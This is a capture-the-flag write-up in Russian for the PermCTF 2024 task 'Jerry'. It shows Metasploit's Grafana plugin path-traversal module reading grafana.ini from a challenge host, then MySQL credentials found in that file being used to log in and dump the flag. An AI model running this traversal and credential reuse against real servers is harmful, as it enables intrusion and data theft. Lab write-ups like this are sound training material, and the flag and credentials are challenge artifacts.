# Jerry
## Описание
![Описание задания](https://raw.githubusercontent.com/EogoK/permctf2024_writeup/refs/heads/main/photos/jerry.jpg)


## Решение 

1. grafana path traversal

```
search grafana
msf6 auxiliary(scanner/http/grafana_plugin_traversal) > use 1
msf6 auxiliary(scanner/http/grafana_plugin_traversal) > options 

Module options (auxiliary/scanner/http/grafana_plugin_traversal):

   Name          Current Setting                  Required  Description
   ----          ---------------                  --------  -----------
   DEPTH         13                               yes       Traversal depth
   FILEPATH      /etc/grafana/grafana.ini         yes       The name of the file to download
   PLUGINS_FILE  /usr/share/metasploit-framework  yes       File containing plugins to enumerate
                 /data/wordlists/grafana_plugins
                 .txt
   Proxies                                        no        A proxy chain of format type:host:port[,type:host:port
                                                            ][...]
   RHOSTS        127.0.0.1                        yes       The target host(s), see https://docs.metasploit.com/do
                                                            cs/using-metasploit/basics/using-metasploit.html
   RPORT         3000                             yes       The target port (TCP)
   SSL           false                            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /                                yes       Path to Grafana instance
   THREADS       1                                yes       The number of concurrent threads (max one per host)
   VHOST                                          no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/http/grafana_plugin_traversal) > set rhosts 84.201.168.221
rhosts => 84.201.168.221
msf6 auxiliary(scanner/http/grafana_plugin_traversal) > run

[+] Detected vulnerable Grafana: 8.2.6
[*] 84.201.168.221 - Progress   0/40 (0.0%)
[+] alertlist was found and exploited successfully
[+] 84.201.168.221:3000 - File saved in: .msf4/loot/20240902122707_default_84.201.168.221_grafana.loot_106841.ini
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

2. cat ini grafana

```
cat .msf4/loot/20240902122500_default_84.201.168.221_grafana.loot_007379.ini

# Enable or disable loading other base map layers
;enable_custom_baselayers = true
# Джерри Смит думал, что хорошо спрятал  свои креды для подключения к БД, не очень умно:) 
# cred: snowball:bd3ba762fc6d785ba0ca02f3fdf48d44 
# port: 3366
# BD_MySql
```

3. connect to mysql db

```
mysql -u snowball -h 84.201.168.221 -p -P 3366
password: bd3ba762fc6d785ba0ca02f3fdf48d44 

use Jerry_Smith;
select * From Jerry_Smith;

+----------------------------------------+
| PermCTF                                |
+----------------------------------------+
| {71c5a594bafa341fa7bf4720c6256fdtygr4} |
+----------------------------------------+
```

## Ресурсы

https://github.com/rapid7/metasploit-framework/blob/master/documentation/developers_guide.pdf

## Флаг
PermCTF{71c5a594bafa341fa7bf4720c6256fdtygr4}